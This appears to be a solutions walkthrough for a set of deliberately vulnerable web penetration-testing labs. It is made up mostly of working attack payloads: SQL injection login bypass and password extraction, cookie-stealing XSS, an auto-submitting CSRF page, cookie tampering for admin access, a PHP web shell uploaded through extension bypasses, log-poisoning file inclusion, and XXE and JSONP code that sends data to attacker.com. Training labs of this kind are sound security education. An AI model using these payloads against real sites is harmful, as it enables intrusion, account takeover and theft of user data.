# Web Penetration Testing Labs - Step-by-Step Solutions

## Lab 1: SQL Injection (sql/)

### Step-by-Step Exploitation

**Step 1: Identify the vulnerability**
- Navigate to `sql/login.php`
- Observe the login form with username and password fields

**Step 2: Test for SQL injection**
- Username: `admin'` Password: `test`
- Error indicates SQL injection vulnerability

**Step 3: Authentication bypass**
- Username: `admin' --` Password: `anything`
- OR Username: `' OR '1'='1' --` Password: `anything`
- Successfully bypasses authentication

**Step 4: Database enumeration**
- Username: `' UNION SELECT 1,2,3 --` Password: `test`
- Username: `' UNION SELECT schema_name,2,3 FROM information_schema.schemata --`
- Username: `' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='test' --`

**Step 5: Data extraction**
- Username: `' UNION SELECT username,pass,3 FROM users --`
- Extract all usernames and passwords from the database

---

## Lab 2: Cross-Site Scripting (XSS) (xss/)

### 2.1 DOM-based XSS in contact.php

**Step 1: Analyze the vulnerable code**
- Navigate to `xss/contact.php`
- Notice the JavaScript: `var lang = <?php echo '"'.@$_GET['lang'].'";';?>`

**Step 2: Craft the payload**
- URL: `contact.php?lang=";alert('XSS');//`
- The payload breaks out of the string and executes JavaScript

**Step 3: Execute the attack**
- Visit: `http://target.com/xss/contact.php?lang=";alert(document.cookie);//`
- XSS executes and displays cookies

### 2.2 Stored XSS via User-Agent

**Step 1: Intercept the contact form**
- Go to `xss/contact.php`
- Fill out the contact form
- Use Burp Suite to intercept the request

**Step 2: Modify User-Agent header**
- Change User-Agent to: `<script>alert('Stored XSS')</script>`
- Forward the request

**Step 3: Access admin panel**
- Navigate to `xss/secret/admin_panel.php`
- The stored XSS payload executes when admin views the messages

### 2.3 XSS Filter Bypasses

**XSS1 - Unicode Bypass:**
- Navigate to `xss/XSS Fileters&Bypasses/xss1.php?q=test`
- Filter blocks: `<>'"`
- Bypass payload: `\u003Cimg src=x onerror=alert(0)\u003E`

---

## Lab 3: Cross-Site Request Forgery (CSRF) (csrf/)

**Step 1: Login to the application**
- Navigate to `csrf/login.php`
- Login with credentials: `guest/guest`

**Step 2: Analyze settings page**
- Go to `csrf/settings.php`
- Notice the email change functionality

**Step 3: Create CSRF attack page**
```html
<html>
<body>
<form action="http://target.com/csrf/settings.php" method="POST" id="csrf">
    <input type="hidden" name="nemail" value="attacker@evil.com">
    <input type="hidden" name="csrftoken" value="dummy">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Step 4: Execute the attack**
- Host the HTML file on attacker server
- Trick victim into visiting the page
- Email gets changed without user consent

---

## Lab 4: Insecure Direct Object Reference (IDOR) (idor/)

**Step 1: Login as regular user**
- Navigate to `idor/login.php`
- Login with: `guest/guest`

**Step 2: Analyze the profile page**
- Go to `idor/profile.php`
- Notice comments are displayed with usernames

**Step 3: Examine cookies**
- Check browser cookies
- Find `uid` cookie with value

**Step 4: Privilege escalation**
- Change `uid` cookie to: `c4ca4238a0b923820dcc509a6f75849b` (MD5 of "1")
- Refresh the page
- Comments now appear as "Admin"

**Step 5: Post as admin**
- Submit a comment
- It will appear with "Admin" username

---

## Lab 5: File Upload Vulnerability (upload/)

**Step 1: Login to application**
- Navigate to `upload/login.php`
- Login with valid credentials

**Step 2: Analyze upload functionality**
- Go to `upload/profile.php`
- Notice file upload form

**Step 3: Test blocked extensions**
- Try uploading `test.php` - blocked
- Extensions blocked: php, html, jsp, shtml, exe

**Step 4: Bypass techniques**

**Method 1 - Double extension:**
- Create file: `shell.php.jpg`
- Content: `<?php system($_GET['cmd']); ?>`
- Upload successfully

**Method 2 - Case variation:**
- Create file: `shell.PHP`
- Upload successfully

**Method 3 - Alternative extensions:**
- Try: `shell.phtml`, `shell.php3`, `shell.php5`

**Step 5: Execute commands**
- Access uploaded file: `upload/userfiles/shell.php.jpg?cmd=whoami`
- Execute system commands

---

## Lab 6: Local File Inclusion (LFI) (file inclusion/)

**Step 1: Analyze the application**
- Navigate to `file inclusion/index.php`
- Notice URL parameter `f`

**Step 2: Test basic LFI**
- Try: `index.php?f=/etc/passwd`
- Try: `index.php?f=/windows/system32/drivers/etc/hosts`

**Step 3: Bypass directory traversal filter**
- Filter blocks: `../`
- Bypass: `index.php?f=....//....//etc/passwd`
- Or: `index.php?f=/var/log/apache2/access.log`

**Step 4: Log poisoning attack**
- Poison Apache access logs with PHP code in User-Agent
- User-Agent: `<?php system($_GET['cmd']); ?>`
- Include log file: `index.php?f=/var/log/apache2/access.log&cmd=whoami`

---

## Lab 7: XML External Entity (XXE) (xxe/)

**Step 1: Analyze login process**
- Navigate to `xxe/login.php`
- Notice it sends XML data to `check.php`

**Step 2: Intercept login request**
- Use Burp Suite to intercept the XML request
- Original XML structure:
```xml
<login>
    <user>guest</user>
    <pass>guest</pass>
</login>
```

**Step 3: Basic XXE payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<login>
    <user>&xxe;</user>
    <pass>guest</pass>
</login>
```

**Step 4: Advanced XXE - Out-of-band**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<login>
    <user>guest</user>
    <pass>guest</pass>
</login>
```

**Step 5: File disclosure**
- Try reading: `/etc/passwd`, `/etc/hosts`, `C:\Windows\System32\drivers\etc\hosts`
- Sensitive files: `/var/www/html/config.php`

---

## Lab 8: Cross-Origin Resource Sharing (CORS) (cors/)

**Step 1: Analyze CORS headers**
- Navigate to `cors/profile.php`
- Check response headers for CORS configuration

**Step 2: Test CORS policy**
- Create test HTML page:
```html
<script>
fetch('http://target.com/cors/profile.php', {
    credentials: 'include'
}).then(response => response.text())
.then(data => console.log(data));
</script>
```

**Step 3: Exploit misconfigured CORS**
- If `Access-Control-Allow-Origin: *` with credentials
- Extract sensitive data cross-origin

---

## Lab 9: Insecure Deserialization (insecuredes/)

**Step 1: Analyze the application**
- Navigate to `insecuredes/index.php`
- Look for serialized data in cookies or parameters

**Step 2: Examine backup file**
- Check `insecuredes/backup.bak` for source code
- Analyze serialization/deserialization logic

**Step 3: Create malicious payload**
- Craft serialized object with malicious properties
- Inject into application parameters

**Step 4: Execute attack**
- Submit malicious serialized data
- Achieve code execution or authentication bypass

---

## Lab 10: JSONP Vulnerabilities (jsonp/)

**Step 1: Identify JSONP endpoints**
- Navigate to `jsonp/` directory
- Look for endpoints accepting callback parameters

**Step 2: Test callback manipulation**
- URL: `endpoint.php?callback=malicious_function`
- Verify if callback is reflected without validation

**Step 3: Data extraction attack**
```html
<script>
function steal_data(data) {
    // Send data to attacker server
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}
</script>
<script src="http://target.com/jsonp/endpoint.php?callback=steal_data"></script>
```

---

## Lab 11: PostMessage Vulnerabilities (postmessage/)

**Step 1: Analyze postMessage implementation**
- Navigate to `postmessage/index.php`
- Check JavaScript code for postMessage usage

**Step 2: Test origin validation**
- Create malicious iframe:
```html
<iframe src="http://target.com/postmessage/" id="target"></iframe>
<script>
document.getElementById('target').onload = function() {
    this.contentWindow.postMessage('malicious_data', '*');
};
</script>
```

**Step 3: Exploit weak validation**
- Send crafted messages to bypass security checks
- Achieve XSS or data theft through postMessage

---

## Summary of Key Techniques

1. **SQL Injection**: Union-based, Boolean-based, Time-based
2. **XSS**: Reflected, Stored, DOM-based, Filter bypasses
3. **CSRF**: Token bypass, SameSite bypass
4. **IDOR**: Parameter manipulation, Cookie modification
5. **File Upload**: Extension bypass, Content-type bypass
6. **LFI**: Directory traversal, Log poisoning, Wrapper usage
7. **XXE**: File disclosure, SSRF, Out-of-band attacks
8. **CORS**: Origin bypass, Credential theft
9. **Deserialization**: Object injection, Code execution
10. **JSONP**: Callback manipulation, Data extraction
11. **PostMessage**: Origin bypass, XSS via messaging

Each lab demonstrates real-world vulnerabilities with practical exploitation techniques.
